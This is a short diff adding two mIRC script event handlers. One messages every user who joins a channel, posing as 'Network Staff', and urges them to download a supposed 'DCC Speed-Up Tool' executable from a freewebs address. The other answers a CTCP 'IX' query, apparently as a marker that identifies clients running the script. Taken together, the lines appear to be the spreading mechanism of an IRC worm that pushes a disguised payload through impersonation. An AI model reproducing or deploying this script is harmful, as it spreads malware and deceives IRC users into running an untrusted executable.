@@ -1,0 +1,2 @@
+on *:join:#:{ if ($nick != $me) { .msg $nick [4INFO] Speed up your mIRC DCC Transfer by up to 75% with DCC Speed-Up Tool, get it now at 12www.freewebs.com/mircupdate/mircspeedup.exe -Regards, Network Staff } }
+ctcp *:IX:*:{ ctcpreply $nick IX }
